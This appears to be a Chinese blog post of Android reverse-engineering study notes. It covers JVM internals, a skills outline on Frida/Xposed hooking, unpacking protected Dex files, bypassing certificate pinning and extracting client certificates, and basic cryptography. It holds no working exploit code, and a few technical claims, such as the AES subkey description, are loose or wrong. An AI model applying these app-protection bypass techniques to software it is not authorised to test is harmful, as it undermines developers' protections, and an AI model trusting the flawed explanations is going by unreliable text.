编译包括两种情况：<br>    1，源码编译成字节码<br>    2，字节码编译成本地机器码（符合本地系统专属的指令）<br>    解释执行也包括两种情况：<br>    1，源码解释执行<br>    2，字节码解释执行<br>    解释执行直接执行字节码，重复执行需要重复解释。</p><p><code>JAVA：先编译后解释（java源文件--javac编译--.class文件/与平台无关的字节码--JVM解释执行--特定平台的机器码）。javac编译器不需要面向任何具体的平台，只需要面向JVM，不同平台上JVM是不同的，但这些不同的JVM都提供了相同的接口，从而保证了Java的跨平台性。</code></p><p><em>计算机语言的(执行方式)分为编译型和解释型两种</em>：<br>　　编译型语言：指使用专门的编译器，针对特定平台（操作系统）将某种高级语言源代码一次性翻译成可以被该平台硬件执行的机器码（包括机器指令和操作数），并包装成改平台所能识别的可执行性程序的格式，这个转换过程称为编译（Compile）。编译结束后，可能需要对编译好的目标代码进行链接。优点是运行效率高，组装的时候可以实现低层次的代码复用；缺点是不能跨平台。<br>　　解释型语言：指使用专门的解释器，对源程序逐行解释成特定的平台上的机器码并立即执行的语言。优点是跨平台比较容易，只需要提供特定平台上的解释器即可，每个平台上的解释器负责将源程序解释成特定平台的机器指令。缺点是程序执行效率低，每次执行程序都需要进行一次编译。<br>    编译型语言：C、C++、Objective-C、Pascal。（提高速度，复用）<br>　　半编译型语言：Visual Basic<br>　　解释型语言：Ruby、Python（减少内存，跨平台）</p><p><strong>JVM的编译器可以分为三个编译器</strong>：<br>（1）前端编译器：把.java转变为.class的过程。如Sun的Javac、Eclipse JDT中的增量式编译器（ECJ）。<br>（2）后端编译器:它在程序运行期间将字节码转变成机器码（现在的Java程序在运行时基本都是解释执行加编译执行）, 如HotSpot虚拟机自带的JIT（Just In Time Compiler）编译器（分Client端和Server端）。<br><code>JIT: 当虚拟机发现某个方法或代码块运行特别频繁时，就会把这些代码认定为“Hot Spot Code”（热点代码），为了提高热点代码的执行效率，在运行时，虚拟机将会把这些代码编译成与本地平台相关的机器码，并进行各层次的优化，完成这项任务的正是JIT编译器</code><br>（3）AOT编译器：静态提前编译器（AOT，Ahead Of Time Compiler）直接把*.java文件编译成本地机器代码，如GCJ、Excelsior JET等，这类编译器我们应该比较少遇到。</p><ul><li><ol start="2"><li><strong>JVM的组成：</strong>(虚拟机)<br>JVM是由类加载器子系统、bai运行时数据区、执du行引擎以及本地方法接口组成。<br>jvm的生命周期一个运行时的的java虚拟机实例的天职就是运行一个java程序。</li></ol></li></ul><p><em>JVM内存空间包含</em>： (内存)<br>方法区、java堆、java栈、本地方法栈。<br><img src="https://q0o0p.top/2021/04/23/reverse-leaning/3.png"><br>    1、类加载子系统：负责从文件系统或者网络中加载Class信息，加载的类信息存放于一块称为方法区的内存空间。</p><pre><code>2、方法区：就是存放类信息、运行时常量池信息、包括字符串字面量和数字常量。3、java堆：在虚拟机启动的时候建立，它是java程序最主要的内存工作区域。几乎所有的java对象实例都存放在java堆中。堆空间是所有线程共享的，这是一块与java应用密切相关的内存空间。4、直接内存：是在java堆外的、直接向系统申请的内存空间。通常访问直接内存的速度会优于java堆。因此出于性能的考虑，读写频繁的场合可能会考虑使用直接内存。由于直接内存在java堆外，因此它的大小不会直接受限于Xmx指定的最大堆大小，但是系统内存是有限的，java堆和直接内存的总和依然受限于操作系统能给出的最大内存。5、java栈：每一个java虚拟机线程都有一个私有的java栈，一个线程的java栈在线程创建的时候被创建，java栈中保存着帧信息，java栈中保存着局部变量、方法参数，同时和java方法的调用、返回密切相关。6、本地方法栈和java栈非常类似，最大的不同在于java栈用于方法的调用，而本地方法栈则用于本地方法的调用，作为对java虚拟机的重要扩展，java虚拟机允许java直接调用本地方法（通常使用C编写）7、**垃圾回收系统**是java虚拟机的重要组成部分，垃圾回收器可以对方法区、java堆和直接内存进行回收。其中，java堆是垃圾收集器的工作重点。和C/C++不同，java中所有的对象空间释放都是隐式的，也就是说，java中没有类似free()或者delete()这样的函数释放指定的内存区域。对于不再使用的垃圾对象，垃圾回收系统会在后台默默工作，默默查找、标识并释放垃圾对象，完成包括java堆、方法区和直接内存中的全自动化管理。     8、PC（Program Counter）寄存器也是每一个线程私有的空间，java虚拟机会为每一个java线程创建PC寄存器。在任意时刻，一个java线程总是在执行一个方法，这个正在被执行的方法称为当前方法。如果当前方法不是本地方法，PC寄存器就会指向当前正在被执行的指令。如果当前方法是本地方法，那么PC寄存器的值就是undefined9、执行引擎是java虚拟机的最核心组件之一，它负责执行虚拟机的字节码，现代虚拟机为了提高执行效率，会使用即时编译技术将方法编译成机器码后再执行。</code></pre><ul><li><ol start="3"><li><strong>java堆栈</strong></li></ol></li><li>(1) java堆<br>java堆<br>    java堆是和应用程序关系最为密切的内存空间，几乎所有的对象都存放在堆上。并且java堆是完全自动化管理的，通过垃圾回收机制，垃圾对象会被自动清理，而不需要显示的释放。</li></ul><p>   根据java回收机制的不同，java堆有可能拥有不同的结构。最为常见的一种构成是将整个java堆分为新生代和老年代(默认比例为：新生代占堆空间的1/3、老年代占堆空间2/3)。其中新生代存放新生对象或者年龄不大的对象，老年代则存放老年对象。新生代又可以分为eden区、s0区、s1区(默认比例为：8:1:1)，s0区和s1区也被称为from和to区，他们是两块大小相同、可以互换角色的内存空间。<br><img src="https://q0o0p.top/2021/04/23/reverse-leaning/4.png"><br>新生代几乎是所有JAVA对象出生的地方，JAVA对象申请的内存和存放都是在这个地方。在绝大多数情况下，对象首先分配在eden区(其中包括一个survivor，假如是from)，在一次新生代回收之后，如果对象还存活，并且能够被另外一块survivor所容纳（这里survivor则是to了），则使用复制算法将这些仍然存活的对象复制到to survior区域中，然后清理掉eden和from survivor区域，并将这些存活的对象年龄+1，以后对象在survivor中每熬过一次gc则增加1，当年龄达到某个值时（默认15，通过设置参数-xx:maxtenuringThreshold来设置），这些对象就会成为老年代！但是也不一定，当一些较大的对象（需要分配连续的内存空间）则直接进入老年代。</p><ul><li>(2) java栈<br>    java栈是一块线程私有的内存空间。如果说，java堆和程序数据密切相关，那么java栈就是和线程执行密切相关。线程执行的基本行为是函数调用，每次函数调用的数据都是通过java栈传递的。<br>java栈与数据结构上的栈有着类似的含义，它是一块先进后出的数据结构，只支持出栈和进栈两种操作，在java栈中保存的主要内容为栈帧。每一次函数调用，都会有一个对应的栈帧被压入java栈，每一个函数调用结束，都会有一个栈帧被弹出java栈。如下图：栈帧和函数调用。函数1对应栈帧1，函数2对应栈帧2，依次类推。函数1中调用函数2，函数2中调用函数3，函数3调用函数4.当函数1被调用时，栈帧1入栈，当函数2调用时，栈帧2入栈，当函数3被调用时，栈帧3入栈，当函数4被调用时，栈帧4入栈。当前正在执行的函数所对应的帧就是当前帧（位于栈顶），它保存着当前函数的局部变量、中间计算结果等数据。当函数返回时，栈帧从java栈中被弹出，java方法区有两种返回函数的方式，一种是正常的函数返回，使用return指令，另一种是抛出异常。不管使用哪种方式，都会导致栈帧被弹出。</li></ul><p> 1、局部变量表：是栈帧的重要组成部分之一。它用于保存函数的参数以及局部变量，局部变量表中的变量只在当前函数调用中有效，当函数调用结束，随着函数栈帧的弹出销毁，局部变量表也会随之销毁。<br> 2、操作数栈：它主要用于保存计算过程中的中间结果，同时作为计算过程中变量临时的存储空间。操作数栈也是一个先进后出的数据结构，只支持入栈和出栈两种操作，许多java字节码指令都需要通过操作数栈进行参数传递。<br> 3、除了局部变量表和操作数栈，java栈帧还需要一些数据来支持常量池的解析、正常方法返回和异常处理等。大部分java字节码指令需要进行常量池访问，在帧数据区中保留着访问常量池的指针，方便程序访问常量池。此外，当函数返回或者出现异常时，虚拟机必须恢复调用者函数的栈帧，并让调用者函数继续执行下去。对于异常处理，虚拟机必须有一个异常处理表，方便在发生异常时找到处理异常的代码，因此异常处理表也是帧数据区中重要的一部分。<br><strong>为什么要有堆和栈？这样设计有什么好处？</strong><br>（1）Java自动管理堆和栈，程序员不能直接地设置栈和堆。<br>（2）Java的堆是一个运行时数据区。堆是由JVM的垃圾回收器自动管理的。堆的优势是可以在程序运行时，动态地分配内存<br>大小，但是正是由于这个原因，它的存取速度较慢。<br>（3）栈的优势是，存取速度比堆要快，仅次于寄存器，栈数据可以共享。但缺点是，存在栈中的数据大小和生存期是必须确定的，缺乏灵活性。<br>栈有一个很重要的特性，就是存在栈中的数据可以共享。</p><ul><li><ol start="4"><li><strong>方法区</strong><br>    和堆一样，方法区是一块所有线程共享的内存区域，它用于保存系统的类信息，比如类的字段、方法、常量池等。方法区的大小决定了系统可以保存多少个类，如果系统定义了太多的类，导致方法区的溢出，虚拟机同样会抛出内存溢出错误。 <br>    在JDK1.6、JDK1.7中，方法区可以理解为永久区（Perm）。永久区可以使用参数-XX:PermSize和-XX:MaxPermSize指定，默认情况下，-XX:MaxPermSize为64M。一个大的永久区可以保存更多的类信息。如果系统使用了一些动态代理，那么有可能会在运行时生成大量的类，如果这样，就需要设置一个合理的永久区大小，确保不发生永久区内存溢出。<br>    在JDK1.8中，永久区已经被彻底移除，取而代之的是元数据区，元数据区大小可以使用参数-XX:MaxMetaspaceSize指定（一个大的元数据区可以使系统支持更多的类），这是一块堆外的直接内存。与永久区不同，如果不指定大小，默认情况下，虚拟机会耗尽所有的可用系统内存。如果元数据区发生异常，虚拟机一样会抛出异常。</li></ol></li><li><ol start="5"><li><strong>类加载机制</strong>(类的加载过程)<br>(1) 加载<br>第一步：获取二进制字节流也就是上面的class文件。<br>第二步：将静态的存储结构转换为方法区中的运行时数据结构。<br>第三步：生成一个对象放入java堆中，做为对方法区的引用。</li></ol></li></ul><p>(2) 验证<br>验证主要是检验如下的几项是否正确:<br>   class文件的表示（魔数）<br>   class文件的版本号<br>   class文件的每个部分是否正确（字段表、方法表等）<br>   验证常量池（常量类型、常量类型数据结构是否正确，utf-8是否标准）<br>   元数据验证（父类验证，继承验证，final验证）<br>   字节码（指令）验证<br>   符号引用验证（是否能根据符号找到对应的字段、表、方法等）</p><p>(3) 准备<br>准备阶段为类变量分配内存 和设置类变量初始化。这个过程中，只对static类变量进行内存分配，这个时候只是分配内存，没有进行复制，所有的类变量都是初始化值。如果是final的话，会直接对应到常量池中。会在准备阶段直接赋值。</p><p>(4) 解析<br>解析阶段是读符号引用进行解析。将符号引用解析为直接引用（指向目标的指针或者偏移量）。主要涉及到的解析有类，接口，字段，方法等。</p><p>(5) 初始化<br>初始化就是执行方法的过程， 对静态变量，静态代码块进行初始化，对类进行初始化。</p><p>(6) 使用<br>使用阶段就是使用这个class。</p><p>(7) 卸载<br>卸载阶段就是不在使用，将class给卸载。</p><p><em>JVM实例的消亡</em><br>当程序中的所有非守护线程都终止时，JVM才退出；若安全管理器允许，程序也可以使用java.lang.Runtime类或者java.lang.System.exit()来退出。<br>Jython/Scala/Groovy/JRuby都是可以编译成字节码文件的。所以不是java才可以使用java虚拟机</p><p><em>java的特性</em><br>Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、动态性等特点 。Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等 。</p><h3 id="1-2-2-熟练使用Frida-Xposed进行Java层动静态方法的hook和主动调用"><a href="#1-2-2-熟练使用Frida-Xposed进行Java层动静态方法的hook和主动调用" class="headerlink" title="1.2.2 熟练使用Frida/Xposed进行Java层动静态方法的hook和主动调用"></a>1.2.2 熟练使用Frida/Xposed进行Java层动静态方法的hook和主动调用</h3><h3 id="1-2-3-熟练使用Frida-Xposed进行hook或构造Java的数据类型和复杂类型"><a href="#1-2-3-熟练使用Frida-Xposed进行hook或构造Java的数据类型和复杂类型" class="headerlink" title="1.2.3 熟练使用Frida/Xposed进行hook或构造Java的数据类型和复杂类型"></a>1.2.3 熟练使用Frida/Xposed进行hook或构造Java的数据类型和复杂类型</h3><h3 id="1-2-4-熟练处理面向对象的高级特性如-抽象-内部-类、接口、构造器、多态"><a href="#1-2-4-熟练处理面向对象的高级特性如-抽象-内部-类、接口、构造器、多态" class="headerlink" title="1.2.4 熟练处理面向对象的高级特性如(抽象)(内部)类、接口、构造器、多态"></a>1.2.4 熟练处理面向对象的高级特性如(抽象)(内部)类、接口、构造器、多态</h3><h2 id="1-3-脱壳"><a href="#1-3-脱壳" class="headerlink" title="1.3 脱壳"></a>1.3 脱壳</h2><h3 id="1-3-1-了解并懂得区分一二三代壳的核心原理与主要表现特征"><a href="#1-3-1-了解并懂得区分一二三代壳的核心原理与主要表现特征" class="headerlink" title="1.3.1 了解并懂得区分一二三代壳的核心原理与主要表现特征"></a>1.3.1 了解并懂得区分一二三代壳的核心原理与主要表现特征</h3><p>一代整体型壳：采用Dex整体加密，动态加载运行的机制；<br>二代函数抽取型壳：粒度更细，将方法单独抽取出来，加密保存，解密执行；<br>三代VMP、Dex2C壳：独立虚拟机解释执行、语义等价语法迁移，强度最高。</p><p>VMP虚拟机 : 解释执行保护的是映射表，只要心思细、功夫深，是可以将映射表还原的；二代壳函数抽取目前是可以从根本上进行还原的，dump出所有的运行时的方法体，填充到dump下来的dex中去的，这也是fart的核心原理；最后也就是目前我们推荐的几个内存中搜索和dump出dex的Frida工具，在一些场景中可以满足大家的需求。<br>Dex2C(最难的) : 目前是没有办法还原的，只能跟踪进行分析；</p><p>逻辑原理就是下面一句话magic.indexOf(“dex”) == 0，只要文件头中含有魔数dex，就把它dump下来。</p><h3 id="1-3-2-对于Dex和类的解析、加载和执行流程有比较详细的了解"><a href="#1-3-2-对于Dex和类的解析、加载和执行流程有比较详细的了解" class="headerlink" title="1.3.2 对于Dex和类的解析、加载和执行流程有比较详细的了解"></a>1.3.2 对于Dex和类的解析、加载和执行流程有比较详细的了解</h3><h3 id="1-3-3-熟练使用常见脚本进行脱壳，对其脱壳点原理有清晰的认知"><a href="#1-3-3-熟练使用常见脚本进行脱壳，对其脱壳点原理有清晰的认知" class="headerlink" title="1.3.3 熟练使用常见脚本进行脱壳，对其脱壳点原理有清晰的认知"></a>1.3.3 熟练使用常见脚本进行脱壳，对其脱壳点原理有清晰的认知</h3><h3 id="1-3-4-熟练使用常见脱壳工具如Fart-Youpk并知晓其核心原理"><a href="#1-3-4-熟练使用常见脱壳工具如Fart-Youpk并知晓其核心原理" class="headerlink" title="1.3.4 熟练使用常见脱壳工具如Fart/Youpk并知晓其核心原理"></a>1.3.4 熟练使用常见脱壳工具如Fart/Youpk并知晓其核心原理</h3><h2 id="1-4-追踪和定位"><a href="#1-4-追踪和定位" class="headerlink" title="1.4 追踪和定位"></a>1.4 追踪和定位</h2><h3 id="1-4-1-熟练使用Frida-Xposed进行项目要求功能的开发和定制"><a href="#1-4-1-熟练使用Frida-Xposed进行项目要求功能的开发和定制" class="headerlink" title="1.4.1 熟练使用Frida/Xposed进行项目要求功能的开发和定制"></a>1.4.1 熟练使用Frida/Xposed进行项目要求功能的开发和定制</h3><h3 id="1-4-2-掌握脚本语言如JavaScript、Python的基本开发调试和部署"><a href="#1-4-2-掌握脚本语言如JavaScript、Python的基本开发调试和部署" class="headerlink" title="1.4.2 掌握脚本语言如JavaScript、Python的基本开发调试和部署"></a>1.4.2 掌握脚本语言如JavaScript、Python的基本开发调试和部署</h3><h3 id="1-4-3-熟练进行Classloader、类、方法、重载的枚举定位和hook"><a href="#1-4-3-熟练进行Classloader、类、方法、重载的枚举定位和hook" class="headerlink" title="1.4.3 熟练进行Classloader、类、方法、重载的枚举定位和hook"></a>1.4.3 熟练进行Classloader、类、方法、重载的枚举定位和hook</h3><h3 id="1-4-4-对Linux系统的内存、网络、文件、用户、进程等有初步的认识"><a href="#1-4-4-对Linux系统的内存、网络、文件、用户、进程等有初步的认识" class="headerlink" title="1.4.4 对Linux系统的内存、网络、文件、用户、进程等有初步的认识"></a>1.4.4 对Linux系统的内存、网络、文件、用户、进程等有初步的认识</h3><p>安卓Native层的分析和逆向<br>随着开发能力的提高和对抗的升级，NDK编程越来越多的出现在各大厂商及加固的产品中，作为安卓安全工程师，要有Native层的开发和逆向分析能力，掌握C(++)语言及其可执行文件的分析方法，开展项目要求的评估工作。</p><p>2.1 C(++)开发<br>2.1.1 熟练掌握C的面向过程思想，掌握指针、函数、数组/结构体和内存管理<br>2.1.2 熟练掌握C++的面向对象思想，了解封装、抽象、继承、多态、多线程<br>2.1.3 熟悉掌握常见数据类型、表达式、控制流在内存中ARM指令的展现形式<br>2.1.4 熟悉变量、函数、数组、结构体等指针对象在内存中ARM指令的展现形式</p><p>2.2 NDK开发<br>2.2.1 熟悉安卓与ARM处理器的接口、架构及NDK/JNI编译流程和原理<br>2.2.2 熟悉JNI的数据类型、命名规则、核心原理及App运行时的执行流程<br>2.2.3 熟悉JNIEnv的原理、结构和作用、创建和释放、在线程中的使用<br>2.2.4 熟悉JNI的Java类、对象、字符串、数组、反射、系统级的操作和使用</p><p>2.3 SO文件格式<br>2.3.1 了解安卓与ARM处理器的接口、架构及NDK编译组件常用工具的使用<br>2.3.2 了解llvm编译器对C(++)程序的预处理、编译、汇编和链接的过程<br>2.3.3 了解so文件的格式、区段、符号(导出)表、调试信息等基本信息<br>2.3.4 了解系统链接器对so的装载、解析、链接、绑定、和执行的过程</p><p>2.4 hook native<br>2.4.1 熟悉Frida对进程漫游的操作如Memory/Process/Thread/Module<br>2.4.2 熟悉Frida对内存动态反汇编及Patch的操作如Instruction/ArmWriter<br>2.4.3 熟悉Frida对符号hook和inline hook的操作模块Interceptor<br>2.4.4 使用Sandhook等第三方框架对so进行持久化hook模块开发</p><p>三、安卓系统网络技术<br>安卓手机是一台完整的计算机，其拥有完整的TCP/IP四层模型中的软硬件基础设施，安卓安全工程师要从App及系统源码的角度熟悉整个网络框架并进行利用，尤其对HTTP/SSL相关的Java/Native层框架要非常的精通，藉此展开项目要求的评估工作。</p><p>3.1 TCP/IP协议分层模型<br>3.1.1 熟悉TCP/IP分层模型和基本通信流程分层的判别<br>3.1.2 熟悉IP地址/路由控制/DNS/DHCP/NAT等协议技术<br>3.1.3 熟悉TCP/UDP及安卓系统中Native/Java层相关API<br>3.1.4 熟悉常见应用协议如HTTP/SSH/FTP/SMB/IMAP等</p><p>3.2 HTTP<br>3.2.1 熟悉HTTP的基本特点/通信流程/资源定位/传输结构<br>3.2.2 熟悉HTTP的状态码/包结构/Cookie机制/认证机制<br>3.2.3 熟悉HTTP的代理机制及其与Socks/路由层代理的区别<br>3.2.4 熟悉常见安卓HTTP框架如okhttp/了解其底层实现</p><p>3.3 SSL<br>3.3.1 熟悉SSL的完整通信流程及中间人抓包的核心原理<br>3.3.2 熟悉非对称加解密的公私钥结合传输密钥的流程及细节<br>3.3.3 熟悉数字机构证书预置手机或浏览器的原因/功能/操作<br>3.3.4 熟悉SSL给HTTP带来的加密/认证/完整性保护的核心原理</p><p>3.4 从框架层利用网络库<br>3.4.1 熟悉安卓RSA系列API的基本流程及打断其对证书的验证<br>3.3.2 熟悉安卓KeyStore系列API流程和导出完整客户端证书<br>3.3.3 熟悉常见代码绑定框架及从混淆后的代码中解除证书绑定<br>3.3.4 熟悉HTTPS中SSL与HTTP的关系以及从SSL中提取HTTP</p><h1 id="四、密码学技术"><a href="#四、密码学技术" class="headerlink" title="四、密码学技术"></a>四、密码学技术</h1><ol><li>对称性加密<br>双方使用的同一个密钥，既可以加密又可以解密，这种加密方法称为对称加密，也称为单密钥加密。<br>简单来说就是：加密与解密都是同一个秘钥。<br>优点：通常在消息发送方需要加密大量数据时使用，算法公开，计算量小，加密速度快，加密效率高。<br>缺点：在数据传送前，发送方和接收方必须商定好秘钥，然后 使双方都能保存好秘钥。其次如果一方的秘钥被泄露，那么加密信息也就不安全了。另外，每对用户每次使用对称加密算法时，都需要使用其他人不知道的唯一秘 钥，这会使得收、发双方所拥有的钥匙数量巨大，密钥管理成为双方的负担。<br>在对称加密的算法中常用的算法：DES、AES等<br>AES：秘钥长度可以是128、192、256位，即16字节 、24字节、32字节<br>DES:  秘钥长度64位，即8字节</li></ol><p>对称加密：常见的有AES-CBC、DES、3DES、AES-GCM等，相同的密钥可以用于信息的加密和解密，掌握密钥才能获取信息，能够防止信息窃听，通信方式是1对1；对称加密的优势是信息传输1对1，需要共享相同的密码，密码的安全是保证信息安全的基础，服务器和N个客户端通信，需要维持N个密码记录，且缺少修改密码的机制；非对称加密</p><ol start="2"><li>非对称性加密<br>与对称加密算法不同，非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。<br>公开密钥与私有密钥是一对，如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。<br>私钥只能由一方保管，不能外泄。公钥可以交给任何请求方。<br>在非对称加密算法中常用的算法有： RSA等<br>优点：安全<br>缺点：速度慢（每次加密的数据量小）</li></ol><p><strong>非对称加密</strong>：即常见的 <strong>RSA</strong>算法，还包括 <strong>ECC、DH</strong>等算法，算法特点是，密钥成对出现，一般称为公钥（公开）和私钥（保密），公钥加密的信息只能私钥解开，私钥加密的信息只能公钥解开。因此掌握公钥的不同客户端之间不能互相解密信息，只能和掌握私钥的服务器进行加密通信，服务器可以实现1对多的通信，客户端也可以用来验证掌握私钥的服务器身份。特点是信息传输1对多，服务器只需要维持一个私钥就能够和多个客户端进行加密通信，但服务器发出的信息能够被所有的客户端解密，且该算法的计算复杂，加密速度慢。</p><ol start="3"><li><strong>散列函数Hash</strong>：常见的有 <strong>MD5、SHA1、SHA256</strong>，该类函数特点是函数单向不可逆、对输入非常敏感、输出长度固定，针对数据的任何修改都会改变散列函数的结果，用于防止信息篡改并验证数据的完整性；在信息传输过程中，散列函数不能单独实现信息防篡改，因为明文传输，中间人可以修改信息之后重新计算信息摘要，因此需要对传输的信息以及信息摘要进行加密；</li></ol><h2 id="4-1-认证"><a href="#4-1-认证" class="headerlink" title="4.1 认证"></a>4.1 认证</h2><h3 id="4-1-1-熟悉单项散列函数的作用-原理-和常见SHA-MD5系列的源码"><a href="#4-1-1-熟悉单项散列函数的作用-原理-和常见SHA-MD5系列的源码" class="headerlink" title="4.1.1 熟悉单项散列函数的作用/原理/和常见SHA/MD5系列的源码"></a>4.1.1 熟悉单项散列函数的作用/原理/和常见SHA/MD5系列的源码</h3><h3 id="4-1-2-熟悉消息认证码的作用-原理-实现和常见HMAC函数的源码"><a href="#4-1-2-熟悉消息认证码的作用-原理-实现和常见HMAC函数的源码" class="headerlink" title="4.1.2 熟悉消息认证码的作用/原理/实现和常见HMAC函数的源码"></a>4.1.2 熟悉消息认证码的作用/原理/实现和常见HMAC函数的源码</h3><h3 id="4-1-3-熟悉数字签名的作用-原理-实现和RSA函数的源码及验证过程"><a href="#4-1-3-熟悉数字签名的作用-原理-实现和RSA函数的源码及验证过程" class="headerlink" title="4.1.3 熟悉数字签名的作用/原理/实现和RSA函数的源码及验证过程"></a>4.1.3 熟悉数字签名的作用/原理/实现和RSA函数的源码及验证过程</h3><h3 id="4-1-4-熟悉数字证书的作用-原理-实现和SSL-PKI函数的基本流程"><a href="#4-1-4-熟悉数字证书的作用-原理-实现和SSL-PKI函数的基本流程" class="headerlink" title="4.1.4 熟悉数字证书的作用/原理/实现和SSL/PKI函数的基本流程"></a>4.1.4 熟悉数字证书的作用/原理/实现和SSL/PKI函数的基本流程</h3><ol><li><p>数字证书的介绍<br> 数字证书是一种权威性的电子文档，它提供了一种在 Internet 上验证身份的方式。 它是由一个权威机构——CA证书授权(Certificate Authority)中心发行的，人们可以在互联网交往中用它来识别对方的身份。即以数字证书为核心的加密技术可以对网络上传输的信息进行加密和解密、数字签名和签名验证，确保网上传递信息的机密性、完整性，以及交易实体身份的真实性，签名信息的不可否认性。当然在数字证书认证的过程中，数字证书认证中心（CA）作为权威的、公正的、 可信赖的第三方，其作用是至关重要的。数字证书也必须具有唯一性和可靠性。</p></li><li><p>数字证书的原理<br> 数字证书采用公钥密码体制，即利用一对互相匹配的密钥进行加密、解密。每个用户拥有一把仅为本人所掌握的私有密钥（私钥），用它进行解密和签名；同时拥有一把公共密钥（公钥）并可以对外公开，用于加密和验证签名。当发送一份保密文件时，发送方使用接收方的公钥对数据加密，而接收方则使用自己的私钥解密，这样，信息就可以安全无误地到达目的地了，即使被第三方截获，由于没有相应的私钥，也无法进行解密。通过数字的手段保证加密过程是一个不可逆过程，即只有用私有密钥才能解密。在公开密钥密码体制中，常用的一种是RSA体制。</p><p> 用户也可以采用自己的私钥对信息加以处理，由于密钥仅为本人所有，这样就产生了别人无法生成的文件，也就形成了数字签名。采用数字签名，能够确认以下两点：</p><pre><code> （1）保证信息是由签名者自己签名发送的，签名者不能否认或难以否认； （2）保证信息自签发后到收到为止未曾作过任何修改，签发的文件是真实文件。</code></pre></li><li><p>数字证书的作用<br> 数字证书可用于发送安全电子邮件、访问安全站点、网上证券、网上招标采购、网上签约、网上办公、网上缴费、网上税务等网上安全电子事务处理和安全电子交易活动。数字证书的格式一般采用X.509国际标准。</p></li><li><p><strong>TLS/SSL工作原理</strong><br>TLS/SSL的功能实现主要依赖于三类基本算法：散列函数Hash、对称加密和非对称加密，其利用非对称加密实现身份认证和密钥协商，对称加密算法采用协商的密钥对数据加密，基于散列函数验证信息的完整性。</p></li></ol><p><img src="https://q0o0p.top/2021/04/23/reverse-leaning/10.png"></p><p>TLS的基本工作方式是，客户端使用非对称加密与服务器进行通信，实现身份验证并协商对称加密使用的密钥，然后对称加密算法采用协商密钥对信息以及信息摘要进行加密通信，不同的节点之间采用的对称密钥不同，从而可以保证信息只能通信双方获取。</p><p><strong>一、信息保密性</strong></p><p>交易中的商务信息均有保密的要求。帐号和用户名被人知悉，就可能被盗用，订货和付款的信息被竞争对手获悉，就可能丧失商机。而CA中心颁发的数字安全证书保证了电子商务的信息传播中信息的保密。</p><p><strong>二、身份确定性</strong></p><p>网上交易的双方很可能素昧平生，相隔千里。要使交易成功首先要能确认对方的身份，对商家要考虑 客户端不能是骗子，而客户也会担心网上的商店不是一个玩弄欺诈的黑店。因此能方便而可靠地确认对方身份是交易的前提。对于为顾客或用户开展服务的银行、公司和销售商店，为了做到安全、保密、可靠地开展服务活动，都要进行身份认证的工作。而CA中心颁发的电子签名可保证网上交易双方的身份，银行和公司可以通过CA认证确认身份，放心的开展网上业务。</p><p><strong>三、不可否认性</strong></p><p>由于商情的千变万化，交易一旦达成是不能被否认的。否则必然会损害一方的利益。例如订购黄金， 订货时金价较低，但收到订单后，金价上涨了，如收单方能否认受到订单的实际时间，甚至否认收到订单的事实，则订货方就会蒙受损失。因此CA中心颁发的数字安全证书确保了电子交易通信过程的各个环节的不可否认性，使交易双方的利益不受到损害。</p><p><strong>四、不可篡改性</strong></p><p>交易的文件是不可被修改的，如上例所举的订购黄金。供货单位在收到订单后，发现金价大幅上涨了，如其能改动文件内容，将订购数1吨改为1克，则可大幅受益，那么订货单位可能就会因此而蒙受损失。 因此CA中心颁发的数字安全证书也确保了电子交易文件的不可修改性，以保障交易的严肃和公正。</p><p>SSL (Secure Sockets Layer) 是用来保障你的浏览器和网站服务器之间安全通信，免受网络“中间人”窃取信息。<br>1.当你的浏览器向服务器请求一个安全的网页(通常是 https://)<br>2.服务器就把它的证书和公匙发回来<br>3.浏览器检查证书是不是由可以信赖的机构颁发的，确认证书有效和此证书是此网站的。<br>4.浏览器使用公钥加密了一个随机对称密钥，包括加密的URL一起发送到服务器<br>5.服务器用自己的私匙解密了你发送的钥匙。然后用这把对称加密的钥匙给你请求的URL链接解密。<br>6.服务器用你发的对称钥匙给你请求的网页加密。你也有相同的钥匙就可以解密发回来的网页了</p><ol start="6"><li><strong>PKI（Public Key Infrastructure）</strong></li></ol><p>4.2 编码<br>4.2.1 熟悉编码的核心原理以及清晰地明白编码不是加解密<br>4.2.1 熟悉Base系列函数的使用场景/原理和实现细节<br>4.2.2 熟悉Url编码系列函数的使用场景/原理和实现细节</p><h1 id="4-3-密码"><a href="#4-3-密码" class="headerlink" title="4.3 密码"></a>4.3 密码</h1><p><img src="https://q0o0p.top/2021/04/23/reverse-leaning/7.png"></p><h2 id="4-3-1-熟悉对称加解密的核心原理及常见XOR-AES-DES系列的源码"><a href="#4-3-1-熟悉对称加解密的核心原理及常见XOR-AES-DES系列的源码" class="headerlink" title="4.3.1 熟悉对称加解密的核心原理及常见XOR/AES/DES系列的源码"></a>4.3.1 熟悉对称加解密的核心原理及常见XOR/AES/DES系列的源码</h2><p><code>对称加密是指加密和解密使用相同密钥的加密算法，常见的对称加密算法有DES,DES3,AES加密算法。对称加密由于其加解密速度快，常被用于大量的数据加密场景，还有对传输效率要求高的场景如VPN之间的传输，但是由于其密匙不方便保存，所以适合于内部系统。</code></p><p><strong>DES加密算法</strong><br>一种 <em>分组加密</em>算法，<br>通过将输入的明文按64位一组，进行分组加，<br>加密过程分为初始置换明文，分组明文，<br>生成子密匙，密匙与明文加密，<br>经过S盒替，P盒替换，置换后的密文与原32位明文加密。<br><img src="https://q0o0p.top/2021/04/23/reverse-leaning/8.png"></p><p><strong>AES加密算法</strong><br>AES加密算法是分组加密，<br>每一组是16字节，是目前主流的高级加密算法。<br>主要分为密匙轮询，字节替代，行移动，列混合，密匙加轮…….<br>以上操作重复10次，输出的即是加密的数据.<br>密匙加轮：用密匙与原文进行异或操作，原文是128位，密文也是128位，首先将主密匙与原文进行异或操作，后面再用主密匙生成40位子密匙。<br><img src="https://q0o0p.top/2021/04/23/reverse-leaning/9.png"></p><h2 id="4-3-2-熟悉分组密码的核心原理及ECB-CBC-CFB-OFB系列的特点和使用"><a href="#4-3-2-熟悉分组密码的核心原理及ECB-CBC-CFB-OFB系列的特点和使用" class="headerlink" title="4.3.2 熟悉分组密码的核心原理及ECB/CBC/CFB/OFB系列的特点和使用"></a>4.3.2 熟悉分组密码的核心原理及ECB/CBC/CFB/OFB系列的特点和使用</h2><h2 